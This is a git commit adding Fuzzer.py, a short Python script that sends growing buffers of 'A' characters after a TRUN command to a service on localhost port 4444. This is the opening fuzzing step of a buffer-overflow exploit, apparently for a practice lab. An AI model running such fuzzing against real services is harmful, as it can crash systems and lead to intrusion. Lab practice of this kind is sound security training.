e74627d31a7e96af7096cadcb1e148bd7c877b6f
rdoix <59075479+rdoix@users.noreply.github.com>
2020-09-02 10:05:53 +0700

    Create Fuzzer.py

---
+++ Fuzzer.py
@@ -0,0 +1,27 @@
+#!/usr/bin/python
+import socket, time, sys
+
+ip = "127.0.0.1"
+port = 4444
+timeout = 5
+
+buffer = []
+counter = 100
+while len(buffer) < 30:
+    buffer.append("A" * counter)
+    counter += 100
+
+for string in buffer:
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(timeout)
+        connect = s.connect((ip, port))
+        s.recv(1024)
+        print("Fuzzing loaded with %s bytes" % len(string))
+        s.send("store/shell/TRUN " + string + "\r\n")
+        s.recv(1024)
+        s.close()
+
+    except:
+        print("Could not connect to " + ip + ":" + str(port))
+        sys.exit(0)
